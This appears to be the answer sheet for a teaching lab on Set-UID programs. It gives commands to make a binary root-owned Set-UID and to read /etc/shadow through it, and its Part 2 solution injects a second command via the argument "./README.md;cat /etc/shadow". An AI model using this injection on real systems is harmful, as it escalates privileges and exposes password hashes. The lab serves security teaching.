
# Solutions to the tasks:
## Don't Look Unless you're really stuck!

## Part 1
Task 1: Compile PrintMyUID.c into the program PrintMyUID.
<br>
`
	gcc PrintMyUID.c -o PrintMyUID
`
<br>
Task 2: Run the PrintMyUID program.
<br>
`
	./PrintMyUID
`
<br>
Task 3: Change PrintMyUID to a root Set-UID program.
<br>
`
sudo chown root PrintMyUID
sudo chmod 4755 PrintMyUID
`
<br>
Task 4: Run the PrintMyUID program again and observe the changes.
<br>
`
	$ ./PrintMyUID
`
<br>
Task 5 (Optional): Modify PrintMyUID.c to print the contents of the /etc/shadow file. Repeat steps 1-4.
<br>
`
Change system("whoami"); to system("cat /etc/shadow");
`
<br><br>


## Part 2

Task 1: Compile Exploitable.c and make it a Set-UID program with compile-exploitable.sh
<br>
`
./compile-exploitable.sh
`
<br>
Task 2: Make the Exploitable program execute arbitrary commands as root using only command line arguments.
<br>
`
./Exploitable "./README.md;cat /etc/shadow"
`
<br>


